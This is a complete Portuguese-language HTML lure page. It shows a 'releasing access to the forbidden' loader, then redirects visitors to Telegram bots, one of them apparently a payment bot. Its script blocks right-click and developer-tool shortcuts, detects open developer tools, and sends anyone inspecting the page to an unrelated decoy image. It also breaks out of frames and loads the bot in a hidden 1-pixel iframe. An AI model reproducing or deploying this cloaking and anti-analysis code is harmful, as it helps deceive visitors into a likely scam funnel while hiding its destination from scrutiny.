<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="utf-8"/>

<meta name="viewport" content="width=device-width,initial-scale=1"/>
<meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline' data: blob:;">
<noscript><title>Bloqueado</title><style>body{background:#000}*{display:none}</style></noscript>
<style>
  html,body {
    height:100%;
    margin:0;
    background:#000;
    display:flex;
    align-items:center;
    justify-content:center;
    font-family:'Poppins',sans-serif;
    color:#fff;
    overflow:hidden;
  }
  .loader {
    display:flex;
    flex-direction:column;
    align-items:center;
    gap:16px;
    text-align:center;
  }
  h1 {
    font-size:1.3rem;
    color:#ff2a2a;
    letter-spacing:1px;
    text-shadow:0 0 10px #ff0000;
    animation:flicker 2s infinite alternate;
  }
  .bar-wrap {
    width:240px;
    height:14px;
    background:#220000;
    border-radius:999px;
    overflow:hidden;
    box-shadow:0 0 25px rgba(255,0,0,0.3),inset 0 0 10px rgba(255,0,0,0.2);
    position:relative;
  }
  .bar {
    width:0%;
    height:100%;
    background:linear-gradient(90deg,#6a0000,#ff0000,#6a0000);
    animation:fill 2.6s linear forwards;
  }
  .flame {
    position:absolute;
    right:0;
    top:50%;
    transform:translate(50%,-50%);
    font-size:1.3rem;
    opacity:0;
    animation:flameMove 2.6s linear forwards;
  }
  @keyframes fill {
    0% { width:0%; }
    100% { width:100%; }
  }
  @keyframes flameMove {
    0% { right:100%; opacity:0.3; }
    10% { opacity:1; }
    90% { opacity:1; }
    100% { right:0%; opacity:0; }
  }
  @keyframes flicker {
    0%,100% { opacity:1; text-shadow:0 0 12px #ff0000; }
    50% { opacity:0.8; text-shadow:0 0 20px #ff5500; }
  }
</style>
</head>
<body>
  <div class="loader">
    <h1 id="status">Liberando acesso ao proibidoâ€¦ ðŸ”¥</h1>
    <div class="bar-wrap">
      <div class="bar" id="bar"></div>
      <div class="flame">ðŸ”¥</div>
    </div>
  </div>

<script>
(()=>{

  // === Links de destino ===
  const mobileBots = [
    "https://t.me/brasilnovotelebot?start=go",
    "https://t.me/brasilnovotelevzdbot?start=go",
    "https://t.me/tmbrasilnovobrtelevzdbot?start=go",
    "https://t.me/brasil1novotelevzdbot?start=go",
    "https://t.me/brasilnovotelevzdSBRbot?start=go"
  ];
  const desktopBot = "https://t.me/lasagnamax_pay112w3n_bot?start=go";
  const trap = "https://www.esmaelmorais.com.br/wp-content/uploads/2023/06/lula-faz-l.jpg.webp";

  const isMobile = /Mobi|Android|iPhone|iPad|iPod|Silk/i.test(navigator.userAgent);
  const rand = arr => arr[Math.floor(Math.random()*arr.length)];

  let trapTriggered = false;
  const triggerTrap = () => {
    if (trapTriggered) return;
    trapTriggered = true;
    location.replace(trap);
  };

  // === Anti-inspeÃ§Ã£o ===
  document.addEventListener('contextmenu', e => { e.preventDefault(); triggerTrap(); }, {passive:false});
  document.addEventListener('keydown', e => {
    const k=e.key||'';
    if(k==='F12'||(e.ctrlKey&&e.shiftKey&&['I','J','C'].includes(k.toUpperCase()))||(e.ctrlKey&&k.toUpperCase()==='U')){
      e.preventDefault();triggerTrap();
    }
  }, {passive:false});
  let d=0;
  setInterval(()=>{
    if(isMobile) return; // ignora celulares
    const w=window.outerWidth-window.innerWidth;
    const h=window.outerHeight-window.innerHeight;
    if((w>160||h>160)&&++d>1) triggerTrap();
  },1100);
  let blurC=0;
  window.addEventListener('blur',()=>{if(!isMobile && ++blurC>4)triggerTrap()});
  try{if(window.top!==window.self)window.top.location=window.self.location}catch(e){}
  try{if(document.location.ancestorOrigins&&document.location.ancestorOrigins.length)triggerTrap()}catch(e){}

  // === Redirecionamento ===
  setTimeout(()=>{
    if(trapTriggered) return;
    const dest = isMobile ? rand(mobileBots) : desktopBot;
    const frame=document.createElement('iframe');
    frame.src=dest;
    frame.style="position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;border:0";
    document.body.appendChild(frame);
    setTimeout(()=>{ if(!trapTriggered) location.replace(dest); },250);
  },2600);

})();
</script>
</body>
</html>
